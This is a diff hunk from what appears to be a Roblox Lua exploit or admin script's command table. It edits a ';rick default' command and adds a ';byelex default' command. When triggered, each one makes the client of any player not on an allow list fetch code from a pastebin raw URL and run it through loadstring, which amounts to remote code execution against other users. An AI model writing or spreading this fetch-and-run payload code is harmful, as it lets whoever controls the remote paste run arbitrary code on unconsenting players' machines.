@@ -10692,9 +10692,14 @@ local commands = {
 	end,
 	[";rick default"] = function()
 			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-				loadstring(game:HttpGet("https://pastebin.com/raw/kUYC4LfF"))()
-			end
-		end,
+			loadstring(game:HttpGet("https://pastebin.com/raw/jFR9S661"))()
+		end
+	end,
+	[";byelex default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    loadstring(game:HttpGet("https://pastebin.com/raw/0M0Pa5qt"))()
+	    end
+    end,
 	[";freeze default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
